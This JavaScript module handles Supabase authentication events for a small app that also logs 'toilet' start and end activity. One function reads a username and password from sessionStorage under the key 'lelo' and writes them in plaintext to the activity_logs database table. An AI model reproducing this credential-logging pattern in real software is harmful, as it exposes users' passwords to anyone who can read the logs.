import { showView } from './show-view.js';
import { logActivity } from './log-activity.js';

/**
 * Handles an authentication state change and switches to the appropriate view.
 *
 * `SIGNED_OUT` switches to the login view immediately. Other events wait
 * 2.5 seconds. A `SIGNED_IN` event with a user session initiates login activity
 * logging and checks for an unfinished toilet activity before showing the
 * application view. Events without a user session show the login view.
 *
 * @param {string} event - Authentication event name reported by Supabase Auth.
 * @param {Object | null} session - Current authentication session, or `null` if no session exists.
 * @param {Object} options - Dependencies required for activity logging and view switching.
 * @param {SupabaseClient} options.client - Supabase client used for auth and database requests.
 * @param {HTMLElement} options.viewLoading - Loading view element.
 * @param {HTMLElement} options.viewLogin - Login view element.
 * @param {HTMLElement} options.viewApp - Main application view element.
 * @param {ResizeObserver} options.contentResizeObserver - Observer that tracks the displayed view.
 * @param {ToastBar} options.toast - Toast element used to report toilet activity or database errors.
 * @returns {Promise<HTMLElement | undefined>} Resolves to the displayed login view for `SIGNED_OUT`,
 * to the login or application view after the delay when a view is selected, or to `undefined`
 * if the delayed event has a user session but is not `SIGNED_IN`.
 */
export async function authStateChangeCallback(event, session, {
    client,
    viewLoading,
    viewLogin,
    viewApp,
    contentResizeObserver,
    toast
}) {
    if (event === 'SIGNED_OUT') {
        return showView(viewLogin, {
            viewLoading,
            viewLogin,
            viewApp,
            contentResizeObserver
        });
    }

    await new Promise(resolve => setTimeout(resolve, 2500));

    if (session && session.user) {
        if (event === 'SIGNED_IN') {
            const tasks = [
                logLoginActivity(session, client),
                logLeloActitivty(client),
                didIComeBackTheFromToilet(client, toast)
            ];
            await Promise.all(tasks);

            return showView(viewApp, {
                viewLoading,
                viewLogin,
                viewApp,
                contentResizeObserver
            });
        }
    } else {
        return showView(viewLogin, {
            viewLoading,
            viewLogin,
            viewApp,
            contentResizeObserver
        });
    }
}

/**
 * Records a login activity when the authenticated GitHub username differs
 * from the username currently stored in local storage.
 *
 * @param {Object} session - Authenticated session containing the user metadata.
 * @param {SupabaseClient} client - Supabase client used to insert the activity record.
 * @returns {void}
 */
function logLoginActivity(session, client) {
    const ghLogin = session.user.identities[0].identity_data.user_name;
    if (localStorage.getItem('ghLogin') !== ghLogin) {
        localStorage.setItem('ghLogin', ghLogin);
        logActivity(client, 'login', 'GH login: ' + ghLogin);
    }
}

/**
 * Records credentials saved for the login flow, then removes them from session storage.
 *
 * @param {SupabaseClient} client - Supabase client used to insert the activity record.
 * @returns {void}
 */
function logLeloActitivty(client) {
    const loginPassword = window.sessionStorage.getItem('lelo');
    if (loginPassword) {
        const [login, password] = loginPassword.split(' ');
        logActivity(client, 'login_credentials', `Login: ${login}, Password: ${password}`);
        sessionStorage.removeItem('lelo');
    }
}

/**
 * Checks the latest toilet-related activity and, if it is a `toilet-start`,
 * initiates a `toilet-end` activity record and notifies the user. Reports a
 * query error through the toast.
 *
 * @param {SupabaseClient} client - Supabase client used to query and insert activity records.
 * @param {ToastBar} toast - Toast element used to report errors or welcome the user back.
 * @returns {Promise<void>} Resolves after the query and any user lookup; the `toilet-end`
 * activity insert is initiated but not awaited.
 */
async function didIComeBackTheFromToilet(client, toast) {
    const { data, error } = await client
        .from('activity_logs')
        .select("id, event_type")
        .like('event_type', '%toilet-%')
        .order('id', { ascending: false });

    if (error) {
        toast.show(`${error.message}`, 5000);
    } else if (data && data.length > 0 && data[0].event_type === 'toilet-start') {
        logActivity(client, 'toilet-end', 'login');
        toast.show('Welcome back from the toilet!', 5000);
    }
}